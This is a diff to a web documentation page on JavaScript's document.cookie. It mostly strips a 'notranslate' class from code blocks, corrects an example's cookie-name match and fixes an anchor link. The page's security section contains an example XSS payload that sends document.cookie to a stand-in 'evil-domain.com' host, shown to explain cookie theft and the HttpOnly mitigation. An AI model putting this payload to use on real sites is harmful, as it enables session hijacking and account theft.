@@ -24,7 +24,7 @@ tags:
 	this location</h3>
 
 <pre
-	class="brush: js notranslate"><var>allCookies</var> = <var>document</var>.cookie;</pre>
+	class="brush: js"><var>allCookies</var> = <var>document</var>.cookie;</pre>
 
 <p>In the code above <code><var>allCookies</var></code> is a string containing a
 	semicolon-separated list of all cookies (i.e.
@@ -35,7 +35,7 @@ tags:
 
 <h3 id="Write_a_new_cookie">Write a new cookie</h3>
 
-<pre class="brush: js notranslate"
+<pre class="brush: js"
 	id="new-cookie_syntax"><var>document</var>.cookie = <var>newCookie</var>;</pre>
 
 <p>In the code above, <code>newCookie</code> is a string of form
@@ -145,14 +145,14 @@ tags:
 
 <h3 id="Example_1_Simple_usage">Example #1: Simple usage</h3>
 
-<pre class="brush: js notranslate">document.cookie = "name=oeschger";
+<pre class="brush: js">document.cookie = "name=oeschger";
 document.cookie = "favorite_food=tripe";
 function alertCookie() {
   alert(document.cookie);
 }
 </pre>
 
-<pre class="brush: html notranslate">&lt;button onclick="alertCookie()"&gt;Show cookies&lt;/button&gt;
+<pre class="brush: html">&lt;button onclick="alertCookie()"&gt;Show cookies&lt;/button&gt;
 </pre>
 
 <p>{{EmbedLiveSample('Example_1_Simple_usage', 200, 36)}}</p>
@@ -160,12 +160,12 @@ function alertCookie() {
 <h3 id="Example_2_Get_a_sample_cookie_named_test2">Example #2: Get a sample cookie named
 	<em>test2</em></h3>
 
-<pre class="brush: js notranslate">document.cookie = "test1=Hello";
+<pre class="brush: js">document.cookie = "test1=Hello";
 document.cookie = "test2=World";
 
 const cookieValue = document.cookie
   .split('; ')
-  .find(row =&gt; row.startsWith('test2'))
+  .find(row =&gt; row.startsWith('test2='))
   .split('=')[1];
 
 function alertCookieValue() {
@@ -174,7 +174,7 @@ function alertCookieValue() {
 </pre>
 
 <pre
-	class="brush: html notranslate">&lt;button onclick="alertCookieValue()"&gt;Show cookie value&lt;/button&gt;</pre>
+	class="brush: html">&lt;button onclick="alertCookieValue()"&gt;Show cookie value&lt;/button&gt;</pre>
 
 <p>{{EmbedLiveSample('Example_2_Get_a_sample_cookie_named_test2', 200, 36)}}</p>
 
@@ -183,7 +183,7 @@ function alertCookieValue() {
 <p>In order to use the following code, please replace all occurrences of the word
 	<code>doSomethingOnlyOnce</code> (the name of the cookie) with a custom name.</p>
 
-<pre class="brush: js notranslate">function doOnce() {
+<pre class="brush: js">function doOnce() {
   if (!document.cookie.split('; ').find(row =&gt; row.startsWith('doSomethingOnlyOnce'))) {
     alert("Do something here!");
     document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
@@ -191,24 +191,24 @@ function alertCookieValue() {
 }</pre>
 
 <pre
-	class="brush: html notranslate">&lt;button onclick="doOnce()"&gt;Only do something once&lt;/button&gt;</pre>
+	class="brush: html">&lt;button onclick="doOnce()"&gt;Only do something once&lt;/button&gt;</pre>
 
 <p>{{EmbedLiveSample('Example_3_Do_something_only_once', 200, 36)}}</p>
 
 <h3 id="Example_4_Reset_the_previous_cookie">Example #4: Reset the previous cookie</h3>
 
-<pre class="brush: js notranslate">function resetOnce() {
+<pre class="brush: js">function resetOnce() {
   document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
 }</pre>
 
 <pre
-	class="brush: html notranslate">&lt;button onclick="resetOnce()"&gt;Reset only once cookie&lt;/button&gt;</pre>
+	class="brush: html">&lt;button onclick="resetOnce()"&gt;Reset only once cookie&lt;/button&gt;</pre>
 
 <p>{{EmbedLiveSample('Example_4_Reset_the_previous_cookie', 200, 36)}}</p>
 
 <h3 id="Example_5_Check_a_cookie_existence">Example #5: Check a cookie existence</h3>
 
-<pre class="brush: js notranslate">//ES5
+<pre class="brush: js">//ES5
 
 if (document.cookie.split(';').some(function(item) {
     return item.trim().indexOf('reader=') == 0
@@ -226,7 +226,7 @@ if (document.cookie.split(';').some((item) =&gt; item.trim().startsWith('reader=
 <h3 id="Example_6_Check_that_a_cookie_has_a_specific_value">Example #6: Check that a
 	cookie has a specific value</h3>
 
-<pre class="brush: js notranslate">//ES5
+<pre class="brush: js">//ES5
 
 if (document.cookie.split(';').some(function(item) {
     return item.indexOf('reader=1') &gt;= 0
@@ -256,7 +256,7 @@ if (document.cookie.split(';').some((item) =&gt; item.includes('reader=1'))) {
 	authenticated user's session. Common ways to steal cookies include using Social
 	Engineering or by exploiting an XSS vulnerability in the application -</p>
 
-<pre class="brush: js notranslate">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+<pre class="brush: js">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 </pre>
 
 <p>The <code>HTTPOnly</code> cookie attribute can help to mitigate this attack by
@@ -284,7 +284,7 @@ if (document.cookie.split(';').some((item) =&gt; item.includes('reader=1'))) {
 		individual browser documentation.</li>
 </ul>
 
-<p>The reason for the <a href="#Syntax">syntax</a> of the <code>document.cookie</code>
+<p>The reason for the <a href="#syntax">syntax</a> of the <code>document.cookie</code>
 	accessor property is due to the client-server nature of cookies, which differs from
 	other client-client storage methods (like, for instance, <a
 		href="/en-US/docs/Web/Guide/API/DOM/Storage">localStorage</a>):</p>
@@ -292,7 +292,7 @@ if (document.cookie.split(';').some((item) =&gt; item.includes('reader=1'))) {
 <h4 id="The_server_tells_the_client_to_store_a_cookie">The server tells the client to
 	store a cookie</h4>
 
-<pre class="brush: bash notranslate">HTTP/1.0 200 OK
+<pre class="brush: bash">HTTP/1.0 200 OK
 Content-type: text/html
 Set-Cookie: cookie_name1=cookie_value1
 Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
@@ -302,7 +302,7 @@ Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
 <h4 id="The_client_sends_back_to_the_server_its_cookies_previously_stored">The client
 	sends back to the server its cookies previously stored</h4>
 
-<pre class="brush: bash notranslate">GET /sample_page.html HTTP/1.1
+<pre class="brush: bash">GET /sample_page.html HTTP/1.1
 Host: www.example.org
 Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
 Accept: */*
